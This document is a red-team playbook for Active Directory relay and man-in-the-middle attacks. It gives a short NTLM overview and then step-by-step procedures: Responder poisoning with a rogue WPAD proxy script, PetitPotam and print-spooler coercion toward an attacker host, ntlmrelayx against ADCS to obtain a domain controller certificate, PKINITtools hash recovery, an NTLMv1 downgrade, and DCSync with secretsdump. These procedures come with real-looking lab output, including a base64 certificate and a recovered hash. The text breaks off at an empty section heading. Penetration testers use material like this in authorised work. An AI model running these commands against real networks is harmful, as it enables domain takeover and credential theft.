<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# AD MITM and Relay Attacks
## Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@smbrelay #@ntlmrelay #@capture #@traffic #@authenticate #@authentication #@creds #@credentials #@credential #@relay #@proxy #@proxychain #@proxychains #@dump #@dumping #@ADCS #@downgrade #@auth

Tools

		#@ntlmrelayx #@ntlmrelay #@smbrelay #@smbrelayx #@responder #@impacket #@petitpotam #@crackmapexec #@donpapi #@lsassy #@topotam #@ly4k

</p></details>

## References
<details><summary>References (Click to expand)</summary><p>

* ivoidwarranties blog -<br />[https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/windows-pwnage/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/windows-pwnage/)
* Byt3Bl33d3r Blog: Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes) -<br />[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* Youtube Guide to SMBRelay -<br />[https://www.youtube.com/watch?v=4WP227MuIlk](https://www.youtube.com/watch?v=4WP227MuIlk)
* Charlie Bromberg Twitter: "Mindmap Brain for pass-the-whatever and common attacks operated on Active Directory authentication protocols (NTLM, Kerberos)" -<br />[https://twitter.com/_nwodtuhs/status/1427662242321948676/photo/1](https://twitter.com/_nwodtuhs/status/1427662242321948676/photo/1)
* PayloadAllTheThings GitHub Repo: Active Directory Attack -<br />[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md)
* Reflection Attack MS08-068 -<br />[https://technet.microsoft.com/zh-cn/zh/library/security/ms08-068](https://technet.microsoft.com/zh-cn/zh/library/security/ms08-068)
* Byt3bl33d3r GitHub Blog: "Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)" <br />[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* -<br/>[https://luemmelsec.github.io/Relaying-101/](https://luemmelsec.github.io/Relaying-101/)
* [https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/credentials-prompt-access-webdav-fqdn-sites](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/credentials-prompt-access-webdav-fqdn-sites)
* gladiatx0r GitHub: Workstation-Takeover.md -<br />[https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb)
* -<br />[https://trelis24.github.io/2018/08/03/Windows-WPAD-Poisoning-Responder/](https://trelis24.github.io/2018/08/03/Windows-WPAD-Poisoning-Responder/)
* -<br />[https://t3chnocat.com/tutorial-wpad-mitm/](https://t3chnocat.com/tutorial-wpad-mitm/)
* -<br />[https://www.praetorian.com/blog/obtaining-laps-passwords-through-ldap-relaying-attacks/](https://www.praetorian.com/blog/obtaining-laps-passwords-through-ldap-relaying-attacks/)
* -<br />[https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)

</p></details>

## Overview

<details><summary>Overview (Click to expand)</summary><p>

* [https://miriamxyra.com/2017/11/08/stop-using-lan-manager-and-ntlmv1/](https://miriamxyra.com/2017/11/08/stop-using-lan-manager-and-ntlmv1/)
* NTLM Authentication Process
	1. Upon logon, the client sends the plain-text username to the server
	1. The server generates a random number ("challenge" or "nonce") and sends it to the client
	1. The client encrypts the challenge with the hash of the user-provided password
	1. The encrypted data is sent to the server
	1. The server sends 3 items to the Domain Controller to verify authentication
		* Username
		* Challenge (sent to client in Step 2)
		* Response (sent to server in Step 3/4)
	1. The Domain Controller cross-references the username with its hash within the SAM database and uses it to encrypt/hash the challenge
	1. The Domain Controller compares the encrypted challenge from Step 6 with the client's encrypted challenge from Step 3; if the challenges are identical, authentication is successful
* NTLMv1 vs NTLMv2
	1. Both versions of NTLM authentication follow the steps above to complete the authentication process in a domain. The difference is in how the challenge is handled.
		* NTLMv1 challenge is a constant 16-byte random number while NTLMv2 uses a variable-length challenge
		* NTLMv1 uses the weak DES algorithm which is easily crackable
		* NTLMv2 uses HMAC-MD5 which is difficult to crack/retrieve plaintext but can be relayed
* Windows networks use a variety of a protocols that are susceptible to MiTM attacks if an attacker is able to obtain a foothold within the network. [Responder](https://github.com/lgandx/Responder) is a command-line tool that allows the attacker to quickly start a different rogue servers (HTTP, SMB, LDAP, etc.) that masquerade as traditional appliances found in a typical corporate environment.
* mDNS (Multicast DNS): Conduct DNS resolution on a LAN using broadcast
* LLMNR (Link-Local Multicast Name Resolution): Resolve hostnames on local networks

</p></details>

### Tools

<details><summary>Tools (Click to expand)</summary><p>

* Relay/Capture
	* Impacket -<br />[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
		* ntlmrelayx
	* Responder GitHub-<br />[https://github.com/SpiderLabs/Responder](https://github.com/lgandx/Responder)
		* Responder
		* Multirelay (Responder)
		* Runfinger
* Authentication Coercion
	* PetitPotam
		* topotam (EfsRpcOpenFileRaw, EfsRpcEncryptFileSrv) -<br />[https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
		* ly4k (fka ollypwn) (The other named pipes) -<br />[https://github.com/ly4k/PetitPotam](https://github.com/ly4k/PetitPotam)
			* https://github.com/SecureAuthCorp/impacket/pull/1179
	* Dementor.py -<br />[https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
* NTLMv1 Cracking
	* NTLMv1-Multi -<br />[https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)
* proxy attack tools
	* donpapi -<br />[https://github.com/login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)
	* lsassy

</p></details>

## WARNINGS (Read this before you get in trouble)

<details><summary>Dangerous Tools (Click to expand)</summary><p>

* Responder
	* IMPACTS AVAILABILITY. Run during off-hours
	* Consider running disruptive attacks (including default poisoners) during off-hours
	* Disable with `-A`
	* Whitelist hosts in Responder.conf
	* Poisoning fades after some time
	* Upon initiation, Responder automatically begins poisioning unless `-A` (for Analyze) has been set.
* MITM6
	* IMPACTS AVAILABILITY. Run during off-hours
	* Use host whitelisting (`-hw`)
	* Poisoning fades after some time

</p></details>

## Protocol Guidance
### Overview (Use with proceeding images)

* Relaying **must** be done from one compatible computer to a separate compatible computer.
	* That is, if you relay an authentication from "10.0.0.1", you cannot relay back to "10.0.0.1." The vector would then be a "reflection attack," which has been patched for a while in AD.
* Auth *from* protocol
	* <details><summary>SMB (Click to expand)</summary><p>
		* If relaying `SMB`-->`SMB`, the coerced computer must not *require* SMB signing.
			* Enumeration for SMB Signing: [SMB Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-3_SMB_Enumeration.md)
			* DCs *require* SMB signing
	* HTTP
		* Enumeration for exposed WebDAV: []
		* More OpSec friendly, but rarer to find
		* Doesn't
* Auth *to* protocol
	* <details><summary>SMB (Click to expand)</summary><p>
		* Enumerate Local Admins (useful if not currently Local Admin)
	* <details><summary>LDAPS (Click to expand)</summary><p>
		* Required over LDAP to perform RBCD attack, where machine account asks DC to make a new computer account with Local Admin rights over the coerced machine.
		* `ms-DS-MachineAccountQuota` - By default users on the domain are allowed to create up to 10 machine accounts.
	* <details><summary>HTTP (Click to expand)</summary><p>
* <details><summary>Restrictions (Click to expand)</summary><p>
	* You CAN perform Pass-The-Hash attacks with NTLM hashes.
	* You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.
	* When user not admin
		* No RCE
		* Still relay to LDAP, IMAP, MSSQL, SMB

### Mindmaps and Images
<img src="https://en.hackndo.com/assets/uploads/2020/03/ntlm_resume.png" style="float": left; width="400" />

<img src="https://raw.githubusercontent.com/ShutdownRepo/The-Hacker-Recipes/master/.assets/ntlm_relau_mitigation_chart.png" style="float": left; width="1200" />

<img src="https://raw.githubusercontent.com/ShutdownRepo/The-Hacker-Recipes/master/.gitbook/assets/NTLM%20relay.png" style="float": left; width="1200" />


## Example Attacks: Match enum. to reqs
* Example Attacks
	* <details><summary>DHCP (Click to expand)</summary><p>
		* <details><summary>Notes (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
				* [https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)
		* <details><summary>Requirements (Click to expand)</summary><p>
			* LAN Access
		* Process
			1. Modify Responder config. to include the below in the WPADScript line. Replace the 2 instances of "REPLACEME" with your Responder IP.

					WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY REPLACEME:3128; PROXY REPLACEME:3141; DIRECT';}
			1. Launch Responder in DHCP mode.

					python Responder.py -rPdvI ens33
	* <details><summary>ADCS ESC8: Forced Authentication (**DC Not Required**) (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* [https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
			* [https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
		* <details><summary>Requirements (Click to expand)</summary><p>
			* ADCS Web NTLM Authentication Enabled
			* Know ADCS Server Name
			* Know template options
				* Originally, you could trigger DC --> "DomainController" template. Now, you may look at triggering any Machine/User to any enumerated template they would be allowed.
				* Domain Controller -- "DomainerController" template may fail, but there can be other templates that get you DA-level access.
			* DC, Server, or User Authentication Trigger
		* Process
			1. Initiate ntlmrelayx with `--adcs` and `--template` options.
				* Notes
					* See full attack notes to ensure this part works out.
				* Command

						python examples/ntlmrelayx.py -t https://<certificate-server-name>/certsrv/certfnsh.asp -smb2support --adcs --template "DomainController"
					* **Recommended:** Using split panes in a tmux window allows you to view and troubleshoot the execution of these steps in real time.
						* `Hotkey` + `"`: splits between top and bottom halves
						* `Hotkey` + `%`: splits between left and right halves
					* Example Output

							(impacket) root@gateway0:/home/lab_user/impacket# ntlmrelayx.py -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
							Impacket v0.9.24.dev1+20210727.163808.5f1ced6d - Copyright 2021 SecureAuth Corporation
							                                  
							[*] Protocol Client DCSYNC loaded..
							[*] Protocol Client HTTP loaded..
							[*] Protocol Client HTTPS loaded..
							[*] Protocol Client IMAPS loaded..      
							[*] Protocol Client IMAP loaded..
							[*] Protocol Client LDAP loaded..
							[*] Protocol Client LDAPS loaded..
							[*] Protocol Client MSSQL loaded..
							[*] Protocol Client RPC loaded..            
							[*] Protocol Client SMB loaded..                                                                     
							[*] Protocol Client SMTP loaded..                                      
							[*] Running in relay mode to single host                          
							[*] Setting up SMB Server                                                                            
							                                                                       
							[*] Setting up HTTP Server                                        
							[*] Setting up WCF Server                                                                            
							[*] Servers started, waiting for connections
			1. In a separate terminal window (while NTLM relay is still running and observable), force the DC to perform authentication with the CA. ([TTP](TTP/T1187_Forced_Authentication/T1187.md))
				* Option 1: PetitPotam

						python PetitPotam.py -u <username> -p <password> <attacker_hostname_or_IP> <target_hostname_or_IP>
				* Option 2: PrintSpooler

						python dementor.py -u <username> -p <password> <attacker_hostname_or_IP> <target_hostname_or_IP>
					* Example Output

							(impacket) root@gateway0:/home/lab_user/NetNTLMtoSilverTicket# python ./dementor.py 10.0.0.5 10.0.0.4 -d lab.local -u lab_user -p PASSWORD
							[*] connecting to 10.0.0.4
							[*] bound to spoolss
							[*] getting context handle...
							[*] sending RFFPCNEX...
							[*] Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked
							[*] done!
			1. Save the resulting base64 output data as a file.
				* Example Output

						(impacket) root@gateway0:/home/lab_user/impacket# ntlmrelayx.py -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
						Impacket v0.9.24.dev1+20210727.163808.5f1ced6d - Copyright 2021 SecureAuth Corporation
						                                  
						[*] Protocol Client DCSYNC loaded..
						[*] Protocol Client HTTP loaded..
						[*] Protocol Client HTTPS loaded..
						[*] Protocol Client IMAPS loaded..      
						[*] Protocol Client IMAP loaded..
						[*] Protocol Client LDAP loaded..
						[*] Protocol Client LDAPS loaded..
						[*] Protocol Client MSSQL loaded..
						[*] Protocol Client RPC loaded..            
						[*] Protocol Client SMB loaded..                                                                     
						[*] Protocol Client SMTP loaded..                                      
						[*] Running in relay mode to single host                          
						[*] Setting up SMB Server                                                                            
						                                                                       
						[*] Setting up HTTP Server                                        
						[*] Setting up WCF Server                                                                            
						[*] Servers started, waiting for connections                           
						[*] SMBD-Thread-4: Connection from LAB/DC0$@10.0.0.4 controlled, attacking target http://ca.lab.local
						[*] HTTP server returned error code 200, treating as a successful login                              
						[*] Authenticating against http://ca.lab.local as LAB/DC0$ SUCCEED     
						[*] SMBD-Thread-4: Connection from LAB/DC0$@10.0.0.4 controlled, attacking target http://ca.lab.local
						[*] HTTP server returned error code 200, treating as a successful login                              
						[*] Authenticating against http://ca.lab.local as LAB/DC0$ SUCCEED     
						[*] SMBD-Thread-4: Connection from LAB/DC0$@10.0.0.4 controlled, attacking target http://ca.lab.local
						[*] HTTP server returned error code 200, treating as a successful login
						[*] Authenticating against http://ca.lab.local as LAB/DC0$ SUCCEED
						[*] SMBD-Thread-4: Connection from LAB/DC0$@10.0.0.4 controlled, attacking target http://ca.lab.local
						[*] HTTP server returned error code 200, treating as a successful login
						[*] Authenticating against http://ca.lab.local as LAB/DC0$ SUCCEED
						[*] SMBD-Thread-4: Connection from LAB/DC0$@10.0.0.4 controlled, attacking target http://ca.lab.local
						[*] HTTP server returned error code 200, treating as a successful login
						[*] Authenticating against http://ca.lab.local as LAB/DC0$ SUCCEED
						[*] Generating CSR...
						[*] CSR generated!
						[*] Getting certificate...
						[*] GOT CERTIFICATE!            
						[*] Base64 certificate of user DC0$:
						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
			1. Use PKINITtools to calculate the NT Hash.
				* **Save the *AS-REP encryption key* the command produces.**
				* Command
					
						python gettgtpkinit.py $DOMAIN/<DC_Hostname> -dc-ip <dc_IP_address> -pfx-base64 <base64 output> <outputfile.ccache>
					* `-pfx-base64` parameter: either paste the full base64 data onto command line, or place in file and include "`cat base64_filename`" as the paramater
					* `DC_Hostname` - May be something like "DC0\$" (escape the $)
					* `outputfile` - Successful examples/tests use ".ccache" extension
					* `dc_IP_address` - Optional argument according to specify the DC IP, which can help solve name resolution issues.
				* <details><summary>Example output (click to expand)</summary><p>			

						(impacket2) root@gateway0:/home/lab_user/PKINITtools# python gettgtpkinit.py lab.local/dc0\$ -dc-ip 10.0.0.4 -cert-pem dc0-cert.pem -key-pem dc0-key.pem dc0.ccache
						2021-08-06 18:27:08,045 minikerberos INFO	Loading certificate and key from file
						2021-08-06 18:27:08,094 minikerberos INFO	Requesting TGT
						2021-08-06 18:27:08,121 minikerberos INFO	AS-REP encryption key (you might need this later):
						2021-08-06 18:27:08,121 minikerberos INFO	b2037b9bae658af2437d588b367dd08fd075540a18f74946c11f9416b1b057a9
						2021-08-06 18:27:08,130 minikerberos INFO	Saved TGT to file

			1. Export the produced ccache file into KRB5CCNAME variable (enables passwordless authentication)
				* Command

						export KRB5CCNAME=<dc0.ccache>
				* <details><summary>Example output (click to expand)</summary><p>

						(PKINITtools) user@localhost:~/PKINITtools$ export KRB5CCNAME=dc0.ccache
			1. Use `PKINITtools` `getnthash.py` and set the `-key` parameter to the above `AS-REP encryption key`.
				* Command:

						python getnthash.py $DOMAIN/<DC_Hostname> -dc-ip <dc_IP_address> -key <key>

				* <details><summary>Example output (click to expand)</summary><p>

						(impacket2) root@gateway0:/home/lab_user/PKINITtools# python getnthash.py lab.local/dc0\$ -dc-ip 10.0.0.4 -key b2037b9bae658af2437d588b367dd08fd075540a18f74946c11f9416b1b057a9
						Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

						[*] Using TGT from cache
						[*] Requesting ticket to self with PAC
						Recovered NT Hash
						bbd4eab7b2c01b3bbd4da0ca8dc0daa4

			1. Use the machine hash to perform a malicious activity.
				* Secretsdump

						python examples/secretsdump.py -just-dc $DOMAIN/<username>@<DC_FQDN NOT IP!> -hashes :<nthash>
	* <details><summary>Downgrade Attack (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* [https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
			* [https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
		* Process
			1. Modify `Responder.conf` Challenge: `1122334455667788`
			1. Start Responder with the flag `--disable-ess` (or `--lm` if that fails)

					python Responder.py -I <interface> --disable-ess
			1. Force DC Auth.
				* PetitPotam
					
						python PetitPotam.py -u <username> -p <password> -d $DOMAIN -dc-ip <DC-IP> <Responder-IP> <DC-IP_or_Hostname>
				* PrintSpooler

						SpoolSample.exe <DC-IP_or_Hostname> <Responder-IP>
				* No Hash --> target system is not vulnerable.
			1. Grab the 48 HEX response characters from the incoming DC NTLMv1 auth
			1. Submit to Crack.sh in the format: `NTHASH:<copied_48_chars>`
			1. Check email for nthash
			1. DCSync

				python examples/secretsdump.py -just-dc $DOMAIN/<username>@<DC_FQDN NOT IP!> -hashes :<nthash>
	* <details><summary>CrackMapExec LNK Abuse (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
